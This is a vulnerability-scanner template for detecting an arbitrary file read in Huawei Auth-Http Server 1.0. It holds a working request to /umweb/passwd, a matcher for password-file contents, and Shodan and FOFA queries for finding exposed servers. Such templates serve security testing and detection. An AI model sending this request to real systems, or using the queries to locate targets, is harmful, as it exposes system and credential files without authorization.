http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /umweb/passwd HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/86.0.4240.75 Safari/537.36

    Accept-Charset: utf-8

    Accept-Encoding: gzip

    '
id: huawei-auth-http-server-file-read
info:
  author: anonymous
  classification:
    cwe-id: CWE-200
  description: 'Huawei Auth-Http Server 1.0 version has an arbitrary file read vulnerability
    that allows attackers to read sensitive files on the server, such as system files
    and configuration files.

    '
  metadata:
    fofa-query: server="Huawei Auth-Http Server 1.0"
    product: Auth-Http Server
    shodan-query: '"Huawei Auth-Http Server 1.0" http.title:"User Login"'
    vendor: Huawei
  name: Huawei Auth-Http Server 1.0 Arbitrary File Read
  reference:
  - https://blog.csdn.net/zkaqlaoniao/article/details/134304879
  severity: medium
  tags: file-read, huawei
